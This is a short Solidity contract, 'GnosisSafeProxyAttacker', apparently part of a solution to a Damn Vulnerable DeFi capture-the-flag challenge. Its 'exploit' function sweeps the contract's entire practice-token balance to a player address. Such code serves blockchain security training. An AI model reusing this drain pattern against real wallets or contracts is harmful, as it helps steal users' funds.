// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {IDamnValuableToken} from "./IDamnValuableToken.sol";

contract GnosisSafeProxyAttacker {
    function exploit(address _dvt, address _player) external {
        IDamnValuableToken dvt = IDamnValuableToken(_dvt);
        uint256 dvtBalance = dvt.balanceOf(address(this));
        dvt.transfer(_player, dvtBalance);
    }
}
